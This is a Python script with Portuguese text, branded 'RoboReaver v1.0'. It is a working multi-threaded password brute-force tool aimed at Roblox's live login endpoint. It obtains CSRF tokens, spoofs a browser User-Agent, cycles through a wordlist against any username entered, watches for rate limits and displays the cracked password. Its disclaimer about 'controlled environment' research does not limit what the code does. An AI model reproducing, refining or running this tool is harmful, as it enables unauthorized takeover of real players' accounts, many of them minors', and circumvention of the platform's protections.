import os
import sys
import time
import requests
import threading
from colorama import Fore, Style, init
from itertools import cycle
import webbrowser

# Inicializa o colorama para compatibilidade com o Windows também
init(autoreset=True)

# --- Classes de Estilo e Cores ---
class Estilo:
    BRIGHT = Style.BRIGHT
    RESET = Style.RESET_ALL
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN

# --- Variáveis Globais de Controle ---
senha_encontrada = None
senhas_testadas = 0
lock = threading.Lock()
stop_threads = False
total_senhas = 0

# --- Banner e Animações ---
def banner_principal():
    os.system('clear')
    print(f"""{Estilo.BRIGHT}{Estilo.RED}
 ____       _           ____
|  _ \ ___ | |__   ___ |  _ \ ___  __ _ _ __
| |_) / _ \| '_ \ / _ \| |_) / _ \/ _` | '_ \\
|  _ < (_) | |_) | (_) |  _ <  __/ (_| | | | |
|_| \_\___/|_.__/ \___/|_| \_\___|\__,_|_| |_|
        {Estilo.YELLOW}Brute-Force Avançado para Roblox{Estilo.RESET}
    """)

def banner_sucesso(senha):
    os.system('clear')
    print(Estilo.GREEN + Estilo.BRIGHT)
    print("*" * 60)
    print("*" + " " * 58 + "*")
    print(f"*   {'SENHA ENCONTRADA COM SUCESSO!':^56}   *")
    print("*" + " " * 58 + "*")
    print("*" * 60)
    print(f"\n\n{Estilo.CYAN}A senha para a conta foi localizada:\n")
    print(f"{' ' * 20}{Estilo.YELLOW}>> {senha} <<\n\n")
    print(Estilo.GREEN + "*" * 60)
    print(Style.RESET_ALL)

# --- Lógica de Brute-Force ---

def attempt_login(session, username, password):
    """
    Tenta fazer login com um único par de username/senha.
    Retorna True em caso de sucesso, False em caso de falha.
    """
    login_url = "https://auth.roblox.com/v2/login"
    
    # 1. Obter o token X-CSRF, essencial para a requisição de login
    try:
        response = session.post(login_url, timeout=10)
        csrf_token = response.headers.get("x-csrf-token")
        if not csrf_token:
            return False, "csrf_error"
        session.headers['X-CSRF-TOKEN'] = csrf_token
    except requests.RequestException:
        return False, "network_error"

    # 2. Montar e enviar a requisição de login
    payload = {
        "ctype": "Username",
        "cvalue": username,
        "password": password
    }
    try:
        response = session.post(login_url, json=payload, timeout=10)
        data = response.json()
        
        # O roblox retorna um 'user' object em caso de sucesso
        if "user" in data:
            return True, "success"
        # Verifica erros conhecidos
        elif "errors" in data and any(e.get("code") == 1 for e in data["errors"]):
            return False, "invalid_credentials"
        elif response.status_code == 429: # Too Many Requests
            return False, "rate_limit"
        else:
            return False, "unknown_error"
            
    except (requests.RequestException, ValueError):
        return False, "network_error"


def worker(username, wordlist_queue):
    """
    Função que cada thread executará para testar as senhas.
    """
    global senha_encontrada, senhas_testadas, stop_threads
    
    # Cada thread tem sua própria sessão para simular um navegador independente
    with requests.Session() as session:
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Content-Type': 'application/json;charset=UTF-8',
            'Accept': 'application/json, text/plain, */*'
        })

        while not stop_threads:
            try:
                # Pega uma senha da fila
                password = wordlist_queue.get(timeout=1)
            except:
                # Fila vazia, a thread pode parar
                break
                
            if stop_threads: break
            
            success, reason = attempt_login(session, username, password)

            with lock:
                senhas_testadas += 1
            
            if success:
                with lock:
                    senha_encontrada = password
                    stop_threads = True # Sinaliza para todas as outras threads pararem
                wordlist_queue.task_done()
                break # Sai do loop da thread
            
            elif reason == "rate_limit":
                 # Se o Roblox nos bloquear, é melhor parar por um tempo
                 with lock:
                    if not stop_threads: # Evita múltiplas mensagens de erro
                        print(f"\n{Estilo.RED}{Estilo.BRIGHT}[!] Fomos temporariamente bloqueados (Rate Limit). Pausando...{Estilo.RESET}")
                        stop_threads = True # Para o ataque atual
                        senha_encontrada = "RATE_LIMITED"
            
            wordlist_queue.task_done()

def display_status():
    """
    Thread dedicada a mostrar o status do ataque em tempo real.
    """
    animation = cycle(['|', '/', '-', '\\'])
    start_time = time.time()
    
    while not stop_threads:
        with lock:
            if total_senhas == 0:
                progress = 0
                percent = 0
            else:
                progress = int(50 * senhas_testadas / total_senhas)
                percent = (senhas_testadas / total_senhas) * 100
            
            elapsed_time = time.time() - start_time
            pass_per_second = senhas_testadas / elapsed_time if elapsed_time > 0 else 0
            
            status_bar = f"{Estilo.GREEN}{'█' * progress}{Estilo.RED}{'-' * (50 - progress)}{Estilo.RESET}"
            
            status_text = (
                f"{Estilo.CYAN}{next(animation)} {Estilo.YELLOW}Progresso: {senhas_testadas}/{total_senhas} "
                f"[{status_bar}] {percent:.2f}% | "
                f"{Estilo.MAGENTA}{pass_per_second:.2f} senhas/s"
            )
            
            sys.stdout.write(f"\r{status_text.ljust(80)}")
            sys.stdout.flush()
        
        time.sleep(0.1)
    
    # Limpa a linha de status no final
    sys.stdout.write(f"\r{' ' * 100}\r")
    sys.stdout.flush()

# --- Função Principal do Ataque ---
def start_bruteforce():
    global senha_encontrada, senhas_testadas, stop_threads, total_senhas
    
    banner_principal()
    
    # 1. Obter informações do usuário
    username = input(f"{Estilo.YELLOW}[?] Digite o username da conta Roblox: {Estilo.CYAN}")
    if not username:
        print(f"\n{Estilo.RED}[!] Username não pode ser vazio.{Estilo.RESET}"); time.sleep(2); return

    wordlist_path = input(f"{Estilo.YELLOW}[?] Digite o caminho para sua wordlist (ex: wordlist.txt): {Estilo.CYAN}")
    if not os.path.exists(wordlist_path):
        print(f"\n{Estilo.RED}[!] Arquivo da wordlist não encontrado em '{wordlist_path}'.{Estilo.RESET}"); time.sleep(2); return
        
    try:
        thread_count = int(input(f"{Estilo.YELLOW}[?] Quantas threads usar (recom. 10-50): {Estilo.CYAN}"))
    except ValueError:
        print(f"\n{Estilo.RED}[!] Número de threads inválido.{Estilo.RESET}"); time.sleep(2); return

    # 2. Carregar a wordlist e preparar a fila
    print(f"\n{Estilo.BLUE}[*] Carregando a wordlist, por favor aguarde...{Estilo.RESET}")
    try:
        with open(wordlist_path, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f.readlines() if line.strip()]
        total_senhas = len(passwords)
        if total_senhas == 0:
            print(f"\n{Estilo.RED}[!] Sua wordlist está vazia!{Estilo.RESET}"); time.sleep(2); return
    except Exception as e:
        print(f"\n{Estilo.RED}[!] Erro ao ler a wordlist: {e}{Estilo.RESET}"); time.sleep(2); return

    # Reinicia as variáveis de controle para um novo ataque
    senha_encontrada = None
    senhas_testadas = 0
    stop_threads = False

    # Coloca as senhas na fila para as threads consumirem
    from queue import Queue
    wordlist_queue = Queue()
    for p in passwords:
        wordlist_queue.put(p)

    print(f"{Estilo.GREEN}[+] Wordlist carregada com {total_senhas} senhas.{Estilo.RESET}")
    print(f"{Estilo.BRIGHT}Iniciando ataque em 3 segundos...{Estilo.RESET}")
    time.sleep(3)

    # 3. Iniciar as threads
    threads = []
    
    # Thread de status
    status_thread = threading.Thread(target=display_status)
    status_thread.daemon = True
    status_thread.start()

    # Threads de trabalho (workers)
    for _ in range(thread_count):
        thread = threading.Thread(target=worker, args=(username, wordlist_queue))
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # 4. Aguardar a conclusão
    try:
        # Aguarda as threads finalizarem, ou o status ser interrompido
        wordlist_queue.join() # Bloqueia até que a fila esteja vazia
        stop_threads = True # Garante que a thread de status pare
        
    except KeyboardInterrupt:
        print(f"\n\n{Estilo.RED}[!] Ataque interrompido pelo usuário!{Estilo.RESET}")
        stop_threads = True

    status_thread.join() # Espera a thread de status terminar
    for thread in threads:
        thread.join(timeout=1.0) # Dá um tempinho para as threads de trabalho encerrarem

    # 5. Exibir o resultado
    if senha_encontrada and senha_encontrada != "RATE_LIMITED":
        banner_sucesso(senha_encontrada)
    elif senha_encontrada == "RATE_LIMITED":
        print(f"\n{Estilo.RED}{Estilo.BRIGHT}[X] ATAQUE FALHOU! O Roblox bloqueou nossas tentativas.{Estilo.RESET}")
        print(f"{Estilo.YELLOW}    Tente novamente mais tarde ou use menos threads.{Estilo.RESET}")
    else:
        print(f"\n{Estilo.RED}{Estilo.BRIGHT}[X] ATAQUE FINALIZADO! A senha não foi encontrada na sua wordlist.{Estilo.RESET}")
        print(f"{Estilo.YELLOW}    Tente uma wordlist diferente ou maior.{Estilo.RESET}")
        
    input("\nPressione Enter para voltar ao menu...")


# --- Menu Principal ---
def main_menu():
    while True:
        banner_principal()
        print(f"{Estilo.CYAN}   [1] Iniciar Ataque Brute-Force{Estilo.RESET}")
        print(f"{Estilo.CYAN}   [2] Sobre{Estilo.RESET}")
        print(f"{Estilo.CYAN}   [3] Sair{Estilo.RESET}\n")
        
        choice = input(f"{Estilo.YELLOW}   Escolha uma opção > {Estilo.RESET}")
        
        if choice == '1':
            start_bruteforce()
        elif choice == '2':
            banner_principal()
            print(f"""
    {Estilo.BRIGHT}{Estilo.MAGENTA}RoboReaver v1.0{Estilo.RESET}
    
    Uma ferramenta de brute-force multi-thread avançada,
    construída para fins de pesquisa e testes de segurança
    em contas Roblox em um ambiente controlado.
    
    {Estilo.BLUE}Funcionalidades:{Estilo.RESET}
      - Ataque Multi-Thread para máxima velocidade.
      - Simulação de Navegador com tokens CSRF.
      - Detecção de Rate Limit.
      - Interface de status em tempo real.
    
    {Estilo.CYAN}Autor: [Seu Nickname]{Estilo.RESET}
    {Estilo.CYAN}GitHub: [Link do seu GitHub]{Estilo.RESET}
            """)
            input("\nPressione Enter para voltar ao menu...")
        elif choice == '3':
            print(f"\n{Estilo.YELLOW}Encerrando...{Estilo.RESET}")
            sys.exit(0)
        else:
            print(f"\n{Estilo.RED}[!] Opção inválida, tente novamente.{Estilo.RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main_menu()
